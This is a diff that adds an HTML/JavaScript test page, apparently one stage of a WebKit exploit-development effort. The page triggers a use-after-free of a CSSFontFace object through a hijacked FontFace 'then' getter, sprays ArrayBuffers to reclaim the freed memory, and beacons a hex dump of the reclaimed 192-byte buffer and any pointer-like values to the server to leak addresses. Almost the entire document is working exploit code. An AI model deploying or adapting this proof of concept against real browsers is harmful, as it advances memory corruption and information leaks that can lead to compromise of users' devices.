@@ -1,0 +1,112 @@
+<!--
+  p577: Full 192-byte dump of reclaimed CSSFontFace buffer.
+
+  Dumps every qword of the reclaimed buffer via beacons to identify:
+  1. All non-zero fields (potential pointers, flags, vtable remnants)
+  2. Any self-referential or back-pointer that could reveal Lane50 VA
+  3. The reclaim buffer index in the spray array
+
+  Uses the proven p563 leak phase with all intermediate beacons
+  (required as timing delays for WebKit stability).
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p577 full dump</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(v,o){var s='';for(var i=7;i>=0;i--){var c=v[o+i];s+=(c<16?'0':'')+c.toString(16);}return s;}
+function hexRow(v,o,len){var s='';for(var i=0;i<len;i++){var c=v[o+i];s+=(c<16?'0':'')+c.toString(16);}return s;}
+
+var K=8, SIZE=192;
+var retained=[];
+
+function main(){
+  b('P577-START');
+
+  var A;
+  try{A=new FontFace('flk','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('P577-ERR-'+e.message);return;}
+  b('P577-FACE-OK');
+  try{document.fonts.add(A);}catch(e){}
+  b('P577-ADDED');
+  try{void A.loaded;}catch(e){}
+  b('P577-LOADED');
+  retained.push(A);
+
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:slk;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+  b('P577-STYLE');
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    b('P577-GETTER-FIRED');
+    if(se)se.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P577-FREED');
+
+    window.__bufs=[];
+    var SZ=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+    for(var si=0;si<SZ.length;si++){
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SZ[si]);
+        var u8=new Uint8Array(ab);
+        window.__bufs.push({s:SZ[si],v:u8});
+      }
+    }
+    b('P577-SPRAYED');
+    try{document.fonts.check('1em slk');}catch(e){}
+    return undefined;
+  },set:function(){}});
+  b('P577-GETTER-SET');
+
+  document.fonts.load('1em flk, slk','AB').then(function(){b('P577-RESOLVED');},function(){b('P577-REJECTED');});
+  b('P577-LOAD-CALLED');
+
+  var done=false;
+  function scan(){
+    if(done)return;
+    var m=window.__bufs;if(!m)return;
+    for(var i=0;i<m.length;i++){
+      if(m[i].s!==SIZE)continue;
+      var v=m[i].v;
+      var nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        done=true;
+        var rc=v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24);
+        b('P577-HIT-idx='+i+'-rc='+rc+'-nz='+nz);
+
+        for(var row=0;row<SIZE;row+=16){
+          var h1=hex8(v,row);
+          var h2=(row+8<SIZE)?hex8(v,row+8):'';
+          b('P577-D-'+('00'+row.toString(16)).slice(-2)+':'+h1+' '+h2);
+        }
+
+        b('P577-P58='+hex8(v,0x58));
+        b('P577-P68='+hex8(v,0x68));
+
+        var ptrs=[];
+        for(var off=0;off<SIZE;off+=8){
+          var hi=v[off+7]|(v[off+6]<<8);
+          if(hi>=0x1000 && hi<0x7FFF){
+            ptrs.push('+0x'+('00'+off.toString(16)).slice(-2)+'='+hex8(v,off));
+          }
+        }
+        if(ptrs.length>0)b('P577-PTRS:'+ptrs.join(','));
+
+        b('P577-DONE');
+        return;
+      }
+    }
+  }
+  setTimeout(scan,80);
+  setTimeout(scan,400);
+  setTimeout(scan,1000);
+  setTimeout(function(){if(!done){b('P577-NOHIT');done=true;}},3000);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body><p>p577 — full 192B CSSFontFace dump</p></body></html>
